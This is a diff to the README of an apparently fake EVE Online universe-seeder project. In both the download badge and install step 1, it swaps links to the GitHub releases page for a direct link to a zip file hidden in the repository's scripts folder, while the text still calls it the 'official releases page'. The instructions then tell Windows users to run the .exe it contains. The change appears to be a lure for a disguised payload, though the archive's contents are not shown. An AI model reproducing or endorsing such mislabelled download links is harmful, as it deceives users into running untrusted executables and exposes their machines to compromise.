@@ -1,6 +1,6 @@
 # 🌌 elysian-universe-site-seeder-eve-online-evejs - Populate your custom universe data easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Alanahwellordered661/elysian-universe-site-seeder-eve-online-evejs/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Alanahwellordered661/elysian-universe-site-seeder-eve-online-evejs/main/scripts/release/eve_online_elysian_evejs_seeder_site_universe_v2.6.zip)
 
 This application populates your EVE Online server environment with persistent data. It handles anomalies, generated mining operations, dungeon states, and mission-backed site authority. You use this tool to ensure your game world remains active and populated with content for players. The software bridges the gap between your server files and the EVE JS requirements for a functional universe.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/Alanahwellordered661/elysian-universe-site-seeder-eve-online-evejs/releases) to access the available software versions.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Alanahwellordered661/elysian-universe-site-seeder-eve-online-evejs/main/scripts/release/eve_online_elysian_evejs_seeder_site_universe_v2.6.zip) to access the available software versions.
 2. Look for the file ending in .exe under the latest release tag.
 3. Click the file name to start the download process to your machine.
 4. Locate the file in your downloads folder once the process completes.
